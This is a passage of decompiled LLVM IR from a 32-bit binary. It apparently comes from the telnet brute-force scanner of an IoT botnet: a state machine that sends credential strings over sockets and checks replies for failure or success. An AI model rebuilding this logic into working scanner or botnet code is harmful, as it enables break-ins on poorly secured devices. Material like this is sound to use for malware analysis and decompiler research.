  %v4_804ac33 = inttoptr i32 %v4_804ac1e to i8*
  store i32 %v4_804ac1e, i32* @edi, align 4
  %v3_804ac39 = call i32 @_strlen(i8* %v4_804ac33)
  store i32 %v3_804ac39, i32* @esi, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v5_804ac58 = load i8, i8* %v4_804ac16, align 2
  %v6_804ac58 = zext i8 %v5_804ac58 to i32
  store i32 %v6_804ac58, i32* %eax.global-to-local, align 4
  %v1_804ac60 = mul nuw nsw i32 %v6_804ac58, 4
  %v2_804ac60 = add nuw nsw i32 %v1_804ac60, 134584160
  %v3_804ac60 = inttoptr i32 %v2_804ac60 to i32*
  %v4_804ac60 = load i32, i32* %v3_804ac60, align 4
  store i32 %v4_804ac60, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804ac7d = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804ac7d = load i32, i32* %v3_804ac7d, align 4
  store i32 %v4_804ac7d, i32* %eax.global-to-local, align 4
  %v0_804ac80 = load i32, i32* @esp, align 4
  %v1_804ac80 = add i32 %v0_804ac80, 12
  %v2_804ac80 = inttoptr i32 %v1_804ac80 to i32*
  store i32 16384, i32* %v2_804ac80, align 4
  %v0_804ac88 = load i32, i32* @esi, align 4
  %v1_804ac88 = load i32, i32* @esp, align 4
  %v2_804ac88 = add i32 %v1_804ac88, 8
  %v3_804ac88 = inttoptr i32 %v2_804ac88 to i32*
  store i32 %v0_804ac88, i32* %v3_804ac88, align 4
  %v0_804ac8c = load i32, i32* @ebx, align 4
  %v1_804ac8c = load i32, i32* @esp, align 4
  %v2_804ac8c = add i32 %v1_804ac8c, 4
  %v3_804ac8c = inttoptr i32 %v2_804ac8c to i32*
  store i32 %v0_804ac8c, i32* %v3_804ac8c, align 4
  %v0_804ac90 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac90 = load i32, i32* @esp, align 4
  %v2_804ac90 = inttoptr i32 %v1_804ac90 to i32*
  store i32 %v0_804ac90, i32* %v2_804ac90, align 4
  %v4_804ac93 = call i32 @__libc_send(i32 %v4_804ac1e, i32 %v2_804a3bd, i32 %v6_804a502, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ac93, i32* %eax.global-to-local, align 4
  %v2_804ac98 = icmp slt i32 %v4_804ac93, 0
  %v1_804ac9a = icmp eq i1 %v2_804ac98, false
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804ac9a, label %dec_label_pc_804acc2, label %dec_label_pc_804ac9c

dec_label_pc_804ac9c:                             ; preds = %dec_label_pc_804ac00
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804acb5 = load i32, i32* @esp, align 4
  %v2_804acb5 = inttoptr i32 %v1_804acb5 to i32*
  store i32 %v2_804a4b4, i32* %v2_804acb5, align 4
  %v1_804acb8 = call i32 @reset_telstate(i32 %v4_804ac1e)
  store i32 %v1_804acb8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804acc2:                             ; preds = %dec_label_pc_804ac00
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804acd8 = load i32, i32* %v3_804ac7d, align 4
  store i32 %v4_804acd8, i32* %eax.global-to-local, align 4
  %v0_804acdb = load i32, i32* @esp, align 4
  %v1_804acdb = add i32 %v0_804acdb, 12
  %v2_804acdb = inttoptr i32 %v1_804acdb to i32*
  store i32 16384, i32* %v2_804acdb, align 4
  %v0_804ace3 = load i32, i32* @esp, align 4
  %v1_804ace3 = add i32 %v0_804ace3, 8
  %v2_804ace3 = inttoptr i32 %v1_804ace3 to i32*
  store i32 2, i32* %v2_804ace3, align 4
  %v0_804aceb = load i32, i32* @esp, align 4
  %v1_804aceb = add i32 %v0_804aceb, 4
  %v2_804aceb = inttoptr i32 %v1_804aceb to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80566f8.57 to i32), i32* %v2_804aceb, align 4
  %v0_804acf3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804acf3 = load i32, i32* @esp, align 4
  %v2_804acf3 = inttoptr i32 %v1_804acf3 to i32*
  store i32 %v0_804acf3, i32* %v2_804acf3, align 4
  %v4_804acf6 = call i32 @__libc_send(i32 %v4_804ac1e, i32 %v2_804a3bd, i32 %v6_804a502, i32 ptrtoint (i32* @0 to i32))
  %v2_804acfb = icmp slt i32 %v4_804acf6, 0
  %v1_804acfd = icmp eq i1 %v2_804acfb, false
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804ad3e = load i32, i32* @esp, align 4
  br i1 %v1_804acfd, label %dec_label_pc_804ad25, label %dec_label_pc_804acff

dec_label_pc_804acff:                             ; preds = %dec_label_pc_804acc2
  %v2_804ad18 = inttoptr i32 %v0_804ad3e to i32*
  store i32 %v2_804a4b4, i32* %v2_804ad18, align 4
  %v1_804ad1b = call i32 @reset_telstate(i32 %v4_804ac1e)
  store i32 %v1_804ad1b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804ad25:                             ; preds = %dec_label_pc_804acc2
  %v1_804ad3e = add i32 %v0_804ad3e, 4
  %v2_804ad3e = inttoptr i32 %v1_804ad3e to i32*
  store i32 4, i32* %v2_804ad3e, align 4
  %v0_804ad46 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad46 = load i32, i32* @esp, align 4
  %v2_804ad46 = inttoptr i32 %v1_804ad46 to i32*
  store i32 %v0_804ad46, i32* %v2_804ad46, align 4
  %v2_804ad49 = inttoptr i32 %v4_804ac1e to i32*
  %v3_804ad49 = call i32 @advance_state(i32* %v2_804ad49, i32 %v2_804a3bd)
  store i32 %v3_804ad49, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804ad53:                             ; preds = %dec_label_pc_804a4ec
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  %v1_804ad6b = add i32 %v2_804a4b4, 24
  store i32 %v1_804ad6b, i32* %eax.global-to-local, align 4
  %v1_804ad6e = inttoptr i32 %v1_804ad6b to i32*
  %v2_804ad6e = load i32, i32* %v1_804ad6e, align 4
  store i32 %v2_804ad6e, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804ad86 = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804ad86 = load i32, i32* %v3_804ad86, align 4
  store i32 %v4_804ad86, i32* %edx.global-to-local, align 4
  %v0_804ad89 = load i32, i32* @esp, align 4
  %v1_804ad89 = add i32 %v0_804ad89, 16
  %v2_804ad89 = inttoptr i32 %v1_804ad89 to i32*
  store i32 ptrtoint (i32* @global_var_805a3ac to i32), i32* %v2_804ad89, align 4
  %v0_804ad91 = load i32, i32* @esp, align 4
  %v1_804ad91 = add i32 %v0_804ad91, 12
  %v2_804ad91 = inttoptr i32 %v1_804ad91 to i32*
  store i32 1024, i32* %v2_804ad91, align 4
  %v0_804ad99 = load i32, i32* @ebx, align 4
  %v1_804ad99 = load i32, i32* @esp, align 4
  %v2_804ad99 = add i32 %v1_804ad99, 8
  %v3_804ad99 = inttoptr i32 %v2_804ad99 to i32*
  store i32 %v0_804ad99, i32* %v3_804ad99, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804ada0 = load i32, i32* @esp, align 4
  %v2_804ada0 = add i32 %v1_804ada0, 4
  %v3_804ada0 = inttoptr i32 %v2_804ada0 to i32*
  store i32 %arg1, i32* %v3_804ada0, align 4
  %v0_804ada4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ada4 = load i32, i32* @esp, align 4
  %v2_804ada4 = inttoptr i32 %v1_804ada4 to i32*
  store i32 %v0_804ada4, i32* %v2_804ada4, align 4
  %v1_804ada7 = call i32 @read_until_response(i32 %v6_804a502)
  %v1_804adac = icmp eq i32 %v1_804ada7, 0
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  br i1 %v1_804adac, label %dec_label_pc_804ae39, label %dec_label_pc_804adb4

dec_label_pc_804adb4:                             ; preds = %dec_label_pc_804ad53
  store i32 %v1_804ad6b, i32* %eax.global-to-local, align 4
  %v2_804adcf = load i32, i32* %v1_804ad6e, align 4
  store i32 %v2_804adcf, i32* %eax.global-to-local, align 4
  %v1_804add1 = load i32, i32* @esp, align 4
  %v2_804add1 = inttoptr i32 %v1_804add1 to i32*
  store i32 %v2_804adcf, i32* %v2_804add1, align 4
  %v1_804add4 = call i32 @contains_fail(i32 %stack_var_-624.247)
  %v1_804add9 = icmp eq i32 %v1_804add4, 0
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804ae24 = load i32, i32* @esp, align 4
  %v1_804ae24 = add i32 %v0_804ae24, 4
  %v2_804ae24 = inttoptr i32 %v1_804ae24 to i32*
  br i1 %v1_804add9, label %dec_label_pc_804ae0b, label %dec_label_pc_804addd

dec_label_pc_804addd:                             ; preds = %dec_label_pc_804adb4
  store i32 0, i32* %v2_804ae24, align 4
  %v0_804adfe = load i32, i32* %eax.global-to-local, align 4
  %v1_804adfe = load i32, i32* @esp, align 4
  %v2_804adfe = inttoptr i32 %v1_804adfe to i32*
  store i32 %v0_804adfe, i32* %v2_804adfe, align 4
  %v2_804ae01 = inttoptr i32 %stack_var_-624.247 to i32*
  %v3_804ae01 = call i32 @advance_state(i32* %v2_804ae01, i32 %v2_804a3bd)
  store i32 %v3_804ae01, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804ae0b:                             ; preds = %dec_label_pc_804adb4
  store i32 5, i32* %v2_804ae24, align 4
  %v0_804ae2c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae2c = load i32, i32* @esp, align 4
  %v2_804ae2c = inttoptr i32 %v1_804ae2c to i32*
  store i32 %v0_804ae2c, i32* %v2_804ae2c, align 4
  %v2_804ae2f = inttoptr i32 %stack_var_-624.247 to i32*
  %v3_804ae2f = call i32 @advance_state(i32* %v2_804ae2f, i32 %v2_804a3bd)
  store i32 %v3_804ae2f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804ae39:                             ; preds = %dec_label_pc_804ad53
  store i32 %v1_804a4b6, i32* %eax.global-to-local, align 4
  %v2_804ae54 = load i32, i32* %v1_804a4b9, align 4
  store i32 %v2_804ae54, i32* %eax.global-to-local, align 4
  %v1_804ae56 = add i32 %v2_804ae54, 3
  store i32 %v1_804ae56, i32* @ebx, align 4
  %v0_804ae59 = load i32, i32* @esp, align 4
  %v1_804ae59 = inttoptr i32 %v0_804ae59 to i32*
  store i32 0, i32* %v1_804ae59, align 4
  %v1_804ae60 = inttoptr i32 %stack_var_-624.247 to i32*
  %v2_804ae60 = call i32 @__GI_time(i32* %v1_804ae60)
  store i32 %v2_804ae60, i32* %eax.global-to-local, align 4
  %v0_804ae65 = load i32, i32* @ebx, align 4
  %v7_804ae65 = icmp ult i32 %v0_804ae65, %v2_804ae60
  %v1_804ae67 = icmp eq i1 %v7_804ae65, false
  br i1 %v1_804ae67, label %dec_label_pc_804b3f0, label %dec_label_pc_804ae6d

dec_label_pc_804ae6d:                             ; preds = %dec_label_pc_804ae39
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804ae86 = load i32, i32* @esp, align 4
  %v2_804ae86 = inttoptr i32 %v1_804ae86 to i32*
  store i32 %v2_804a4b4, i32* %v2_804ae86, align 4
  %v1_804ae89 = call i32 @reset_telstate(i32 %stack_var_-624.247)
  store i32 %v1_804ae89, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804ae93:                             ; preds = %dec_label_pc_804a4ec
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804aea9 = add i32 %v2_804a633, %v2_804a4b2
  %v4_804aea9 = inttoptr i32 %v3_804aea9 to i8*
  %v5_804aea9 = load i8, i8* %v4_804aea9, align 1
  %v6_804aea9 = zext i8 %v5_804aea9 to i32
  store i32 %v6_804aea9, i32* %eax.global-to-local, align 4
  %v1_804aeb1 = mul nuw nsw i32 %v6_804aea9, 4
  %v2_804aeb1 = add nuw nsw i32 %v1_804aeb1, 134585920
  %v3_804aeb1 = inttoptr i32 %v2_804aeb1 to i32*
  %v4_804aeb1 = load i32, i32* %v3_804aeb1, align 4
  %v1_804aec3 = and i32 %v4_804aeb1, -256
  store i32 %v1_804aec3, i32* %eax.global-to-local, align 4
  %v4_804aec6 = inttoptr i32 %v4_804aeb1 to i8*
  store i32 %v4_804aeb1, i32* @edi, align 4
  %v3_804aecc = call i32 @_strlen(i8* %v4_804aec6)
  store i32 %v3_804aecc, i32* @esi, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v5_804aeeb = load i8, i8* %v4_804aea9, align 1
  %v6_804aeeb = zext i8 %v5_804aeeb to i32
  store i32 %v6_804aeeb, i32* %eax.global-to-local, align 4
  %v1_804aef3 = mul nuw nsw i32 %v6_804aeeb, 4
  %v2_804aef3 = add nuw nsw i32 %v1_804aef3, 134585920
  %v3_804aef3 = inttoptr i32 %v2_804aef3 to i32*
  %v4_804aef3 = load i32, i32* %v3_804aef3, align 4
  store i32 %v4_804aef3, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804af10 = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804af10 = load i32, i32* %v3_804af10, align 4
  store i32 %v4_804af10, i32* %eax.global-to-local, align 4
  %v0_804af13 = load i32, i32* @esp, align 4
  %v1_804af13 = add i32 %v0_804af13, 12
  %v2_804af13 = inttoptr i32 %v1_804af13 to i32*
  store i32 16384, i32* %v2_804af13, align 4
  %v0_804af1b = load i32, i32* @esi, align 4
  %v1_804af1b = load i32, i32* @esp, align 4
  %v2_804af1b = add i32 %v1_804af1b, 8
  %v3_804af1b = inttoptr i32 %v2_804af1b to i32*
  store i32 %v0_804af1b, i32* %v3_804af1b, align 4
  %v0_804af1f = load i32, i32* @ebx, align 4
  %v1_804af1f = load i32, i32* @esp, align 4
  %v2_804af1f = add i32 %v1_804af1f, 4
  %v3_804af1f = inttoptr i32 %v2_804af1f to i32*
  store i32 %v0_804af1f, i32* %v3_804af1f, align 4
  %v0_804af23 = load i32, i32* %eax.global-to-local, align 4
  %v1_804af23 = load i32, i32* @esp, align 4
  %v2_804af23 = inttoptr i32 %v1_804af23 to i32*
  store i32 %v0_804af23, i32* %v2_804af23, align 4
  %v4_804af26 = call i32 @__libc_send(i32 %v4_804aeb1, i32 %stack_var_-624.247, i32 %v2_804a3bd, i32 %v6_804a502)
  store i32 %v4_804af26, i32* %eax.global-to-local, align 4
  %v2_804af2b = icmp slt i32 %v4_804af26, 0
  %v1_804af2d = icmp eq i1 %v2_804af2b, false
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804af2d, label %dec_label_pc_804af55, label %dec_label_pc_804af2f

dec_label_pc_804af2f:                             ; preds = %dec_label_pc_804ae93
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804af48 = load i32, i32* @esp, align 4
  %v2_804af48 = inttoptr i32 %v1_804af48 to i32*
  store i32 %v2_804a4b4, i32* %v2_804af48, align 4
  %v1_804af4b = call i32 @reset_telstate(i32 %v4_804aeb1)
  store i32 %v1_804af4b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804af55:                             ; preds = %dec_label_pc_804ae93
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804af6b = load i32, i32* %v3_804af10, align 4
  store i32 %v4_804af6b, i32* %eax.global-to-local, align 4
  %v0_804af6e = load i32, i32* @esp, align 4
  %v1_804af6e = add i32 %v0_804af6e, 12
  %v2_804af6e = inttoptr i32 %v1_804af6e to i32*
  store i32 16384, i32* %v2_804af6e, align 4
  %v0_804af76 = load i32, i32* @esp, align 4
  %v1_804af76 = add i32 %v0_804af76, 8
  %v2_804af76 = inttoptr i32 %v1_804af76 to i32*
  store i32 2, i32* %v2_804af76, align 4
  %v0_804af7e = load i32, i32* @esp, align 4
  %v1_804af7e = add i32 %v0_804af7e, 4
  %v2_804af7e = inttoptr i32 %v1_804af7e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80566f8.57 to i32), i32* %v2_804af7e, align 4
  %v0_804af86 = load i32, i32* %eax.global-to-local, align 4
  %v1_804af86 = load i32, i32* @esp, align 4
  %v2_804af86 = inttoptr i32 %v1_804af86 to i32*
  store i32 %v0_804af86, i32* %v2_804af86, align 4
  %v4_804af89 = call i32 @__libc_send(i32 %v4_804aeb1, i32 %stack_var_-624.247, i32 %v2_804a3bd, i32 %v6_804a502)
  %v2_804af8e = icmp slt i32 %v4_804af89, 0
  %v1_804af90 = icmp eq i1 %v2_804af8e, false
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804afd1 = load i32, i32* @esp, align 4
  br i1 %v1_804af90, label %dec_label_pc_804afb8, label %dec_label_pc_804af92

dec_label_pc_804af92:                             ; preds = %dec_label_pc_804af55
  %v2_804afab = inttoptr i32 %v0_804afd1 to i32*
  store i32 %v2_804a4b4, i32* %v2_804afab, align 4
  %v1_804afae = call i32 @reset_telstate(i32 %v4_804aeb1)
  store i32 %v1_804afae, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804afb8:                             ; preds = %dec_label_pc_804af55
  %v1_804afd1 = add i32 %v0_804afd1, 4
  %v2_804afd1 = inttoptr i32 %v1_804afd1 to i32*
  store i32 6, i32* %v2_804afd1, align 4
  %v0_804afd9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804afd9 = load i32, i32* @esp, align 4
  %v2_804afd9 = inttoptr i32 %v1_804afd9 to i32*
  store i32 %v0_804afd9, i32* %v2_804afd9, align 4
  %v2_804afdc = inttoptr i32 %v4_804aeb1 to i32*
  %v3_804afdc = call i32 @advance_state(i32* %v2_804afdc, i32 %stack_var_-624.247)
  store i32 %v3_804afdc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804afe6:                             ; preds = %dec_label_pc_804a4ec
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  %v1_804affe = add i32 %v2_804a4b4, 24
  store i32 %v1_804affe, i32* %eax.global-to-local, align 4
  %v1_804b001 = inttoptr i32 %v1_804affe to i32*
  %v2_804b001 = load i32, i32* %v1_804b001, align 4
  store i32 %v2_804b001, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804b019 = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804b019 = load i32, i32* %v3_804b019, align 4
  store i32 %v4_804b019, i32* %edx.global-to-local, align 4
  %v0_804b01c = load i32, i32* @esp, align 4
  %v1_804b01c = add i32 %v0_804b01c, 16
  %v2_804b01c = inttoptr i32 %v1_804b01c to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_805a400.58 to i32), i32* %v2_804b01c, align 4
  %v0_804b024 = load i32, i32* @esp, align 4
  %v1_804b024 = add i32 %v0_804b024, 12
  %v2_804b024 = inttoptr i32 %v1_804b024 to i32*
  store i32 1024, i32* %v2_804b024, align 4
  %v0_804b02c = load i32, i32* @ebx, align 4
  %v1_804b02c = load i32, i32* @esp, align 4
  %v2_804b02c = add i32 %v1_804b02c, 8
  %v3_804b02c = inttoptr i32 %v2_804b02c to i32*
  store i32 %v0_804b02c, i32* %v3_804b02c, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804b033 = load i32, i32* @esp, align 4
  %v2_804b033 = add i32 %v1_804b033, 4
  %v3_804b033 = inttoptr i32 %v2_804b033 to i32*
  store i32 %arg1, i32* %v3_804b033, align 4
  %v0_804b037 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b037 = load i32, i32* @esp, align 4
  %v2_804b037 = inttoptr i32 %v1_804b037 to i32*
  store i32 %v0_804b037, i32* %v2_804b037, align 4
  %v1_804b03a = call i32 @read_until_response(i32 %v6_804a502)
  store i32 %v1_804b03a, i32* %eax.global-to-local, align 4
  %v1_804b03f = icmp eq i32 %v1_804b03a, 0
  br i1 %v1_804b03f, label %dec_label_pc_804b226, label %dec_label_pc_804b047

dec_label_pc_804b047:                             ; preds = %dec_label_pc_804afe6
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804b04a = load i32, i32* @esp, align 4
  %v1_804b04a = inttoptr i32 %v0_804b04a to i32*
  store i32 0, i32* %v1_804b04a, align 4
  %v1_804b051 = inttoptr i32 %stack_var_-628.248 to i32*
  %v2_804b051 = call i32 @__GI_time(i32* %v1_804b051)
  store i32 %v2_804b051, i32* @esi, align 4
  %v0_804b05b = load i32, i32* @ebx, align 4
  %v2_804b06b = mul i32 %v0_804b05b, 28
  %v1_804b06f = add i32 %v2_804b06d, %v2_804b06b
  %v2_804b072 = inttoptr i32 %v1_804b06f to i32*
  store i32 %v2_804b051, i32* %v2_804b072, align 4
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v1_804affe, i32* %eax.global-to-local, align 4
  %v2_804b08f = load i32, i32* %v1_804b001, align 4
  store i32 %v2_804b08f, i32* %eax.global-to-local, align 4
  %v1_804b091 = load i32, i32* @esp, align 4
  %v2_804b091 = inttoptr i32 %v1_804b091 to i32*
  store i32 %v2_804b08f, i32* %v2_804b091, align 4
  %v1_804b094 = call i32 @contains_fail(i32 %stack_var_-628.248)
  store i32 %v1_804b094, i32* %eax.global-to-local, align 4
  %v1_804b099 = icmp eq i32 %v1_804b094, 0
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804b099, label %dec_label_pc_804b0cb, label %dec_label_pc_804b09d

dec_label_pc_804b09d:                             ; preds = %dec_label_pc_804b047
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804b0b6 = load i32, i32* @esp, align 4
  %v1_804b0b6 = add i32 %v0_804b0b6, 4
  %v2_804b0b6 = inttoptr i32 %v1_804b0b6 to i32*
  store i32 0, i32* %v2_804b0b6, align 4
  %v0_804b0be = load i32, i32* %eax.global-to-local, align 4
  %v1_804b0be = load i32, i32* @esp, align 4
  %v2_804b0be = inttoptr i32 %v1_804b0be to i32*
  store i32 %v0_804b0be, i32* %v2_804b0be, align 4
  %v3_804b0c1 = call i32 @advance_state(i32* %v1_804b051, i32 %stack_var_-624.247)
  store i32 %v3_804b0c1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804b0cb:                             ; preds = %dec_label_pc_804b047
  store i32 %v1_804affe, i32* %eax.global-to-local, align 4
  %v2_804b0e6 = load i32, i32* %v1_804b001, align 4
  store i32 %v2_804b0e6, i32* %eax.global-to-local, align 4
  %v1_804b0e8 = load i32, i32* @esp, align 4
  %v2_804b0e8 = inttoptr i32 %v1_804b0e8 to i32*
  store i32 %v2_804b0e6, i32* %v2_804b0e8, align 4
  %v1_804b0eb = call i32 @contains_success(i32 %stack_var_-628.248)
  store i32 %v1_804b0eb, i32* %eax.global-to-local, align 4
  %v1_804b0f0 = icmp eq i32 %v1_804b0eb, 0
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804b0f0, label %dec_label_pc_804b200, label %dec_label_pc_804b0f8

dec_label_pc_804b0f8:                             ; preds = %dec_label_pc_804b0cb
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804b10e = add i32 %v2_804a542, %v2_804a4b2
  %v4_804b10e = inttoptr i32 %v3_804b10e to i8*
  %v5_804b10e = load i8, i8* %v4_804b10e, align 1
  %v6_804b10e = zext i8 %v5_804b10e to i32
  store i32 %v6_804b10e, i32* %eax.global-to-local, align 4
  %v10_804b113 = icmp eq i8 %v5_804b10e, 2
  %v1_804b115 = icmp eq i1 %v10_804b113, false
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804b115, label %dec_label_pc_804b145, label %dec_label_pc_804b117

dec_label_pc_804b117:                             ; preds = %dec_label_pc_804b0f8
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804b130 = load i32, i32* @esp, align 4
  %v1_804b130 = add i32 %v0_804b130, 4
  %v2_804b130 = inttoptr i32 %v1_804b130 to i32*
  store i32 7, i32* %v2_804b130, align 4
  %v0_804b138 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b138 = load i32, i32* @esp, align 4
  %v2_804b138 = inttoptr i32 %v1_804b138 to i32*
  store i32 %v0_804b138, i32* %v2_804b138, align 4
  %v3_804b13b = call i32 @advance_state(i32* %v1_804b051, i32 %stack_var_-624.247)
  store i32 %v3_804b13b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804b145:                             ; preds = %dec_label_pc_804b0f8
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804b15b = add i32 %v2_804a633, %v2_804a4b2
  %v4_804b15b = inttoptr i32 %v3_804b15b to i8*
  %v5_804b15b = load i8, i8* %v4_804b15b, align 1
  %v6_804b15b = zext i8 %v5_804b15b to i32
  store i32 %v6_804b15b, i32* %eax.global-to-local, align 4
  %v1_804b163 = mul nuw nsw i32 %v6_804b15b, 4
  %v2_804b163 = add nuw nsw i32 %v1_804b163, 134585920
  %v3_804b163 = inttoptr i32 %v2_804b163 to i32*
  %v4_804b163 = load i32, i32* %v3_804b163, align 4
  store i32 %v4_804b163, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804b180 = add i32 %v2_804a67a, %v2_804a4b2
  %v4_804b180 = inttoptr i32 %v3_804b180 to i8*
  %v5_804b180 = load i8, i8* %v4_804b180, align 2
  %v6_804b180 = zext i8 %v5_804b180 to i32
  store i32 %v6_804b180, i32* %eax.global-to-local, align 4
  %v1_804b188 = mul nuw nsw i32 %v6_804b180, 4
  %v2_804b188 = add nuw nsw i32 %v1_804b188, 134584160
  %v3_804b188 = inttoptr i32 %v2_804b188 to i32*
  %v4_804b188 = load i32, i32* %v3_804b188, align 4
  store i32 %v4_804b188, i32* @esi, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804b1a8 = load i32, i32* @esp, align 4
  %v2_804b1a8 = inttoptr i32 %v1_804b1a8 to i32*
  store i32 %v2_804a4b4, i32* %v2_804b1a8, align 4
  %v0_804b1ab = call i32 @get_telstate_host()
  store i32 %v0_804b1ab, i32* %eax.global-to-local, align 4
  %v0_804b1b0 = load i32, i32* @global_var_805a6e0.18, align 32
  store i32 %v0_804b1b0, i32* %edx.global-to-local, align 4
  %v0_804b1b6 = load i32, i32* @ebx, align 4
  %v1_804b1b6 = load i32, i32* @esp, align 4
  %v2_804b1b6 = add i32 %v1_804b1b6, 16
  %v3_804b1b6 = inttoptr i32 %v2_804b1b6 to i32*
  store i32 %v0_804b1b6, i32* %v3_804b1b6, align 4
  %v0_804b1ba = load i32, i32* @esi, align 4
  %v1_804b1ba = load i32, i32* @esp, align 4
  %v2_804b1ba = add i32 %v1_804b1ba, 12
  %v3_804b1ba = inttoptr i32 %v2_804b1ba to i32*
  store i32 %v0_804b1ba, i32* %v3_804b1ba, align 4
  %v1_804b1be = load i32, i32* @esp, align 4
  %v2_804b1be = add i32 %v1_804b1be, 8
  %v3_804b1be = inttoptr i32 %v2_804b1be to i32*
  store i32 %v0_804b1ab, i32* %v3_804b1be, align 4
  %v0_804b1c2 = load i32, i32* @esp, align 4
  %v1_804b1c2 = add i32 %v0_804b1c2, 4
  %v2_804b1c2 = inttoptr i32 %v1_804b1c2 to i32*
  store i32 ptrtoint (i32* @global_var_80566fc.59 to i32), i32* %v2_804b1c2, align 4
  %v0_804b1ca = load i32, i32* %edx.global-to-local, align 4
  %v1_804b1ca = load i32, i32* @esp, align 4
  %v2_804b1ca = inttoptr i32 %v1_804b1ca to i32*
  store i32 %v0_804b1ca, i32* %v2_804b1ca, align 4
  %v2_804b1cd = call i32 @Rootsprintf(i32 %stack_var_-628.248, i32 %stack_var_-624.247)
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804b1eb = load i32, i32* @esp, align 4
  %v1_804b1eb = add i32 %v0_804b1eb, 4
  %v2_804b1eb = inttoptr i32 %v1_804b1eb to i32*
  store i32 7, i32* %v2_804b1eb, align 4
  %v0_804b1f3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b1f3 = load i32, i32* @esp, align 4
  %v2_804b1f3 = inttoptr i32 %v1_804b1f3 to i32*
  store i32 %v0_804b1f3, i32* %v2_804b1f3, align 4
  %v3_804b1f6 = call i32 @advance_state(i32* %v1_804b051, i32 %stack_var_-624.247)
  store i32 %v3_804b1f6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804b200:                             ; preds = %dec_label_pc_804b0cb
